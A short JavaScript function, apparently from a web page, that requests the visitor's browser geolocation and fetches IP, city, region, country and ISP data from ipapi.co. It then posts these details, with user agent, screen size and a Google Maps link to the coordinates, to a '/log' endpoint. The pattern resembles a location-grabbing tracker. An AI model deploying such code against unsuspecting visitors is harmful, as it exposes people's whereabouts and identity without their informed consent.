async function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(async (position) => {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const acc = position.coords.accuracy;
      const screenSize = `${screen.width}x${screen.height}`;
      const userAgent = navigator.userAgent;
      const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;

      const ipData = await fetch("https://ipapi.co/json").then(res => res.json());

      fetch("/log", {
        method: "POST",
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          latitude: lat,
          longitude: lon,
          accuracy: acc,
          ip: ipData.ip,
          city: ipData.city,
          region: ipData.region,
          country: ipData.country_name,
          isp: ipData.org,
          userAgent,
          screen: screenSize,
          mapsUrl
        })
      });
    });
  } else {
    alert("Geolocation not supported.");
  }
}
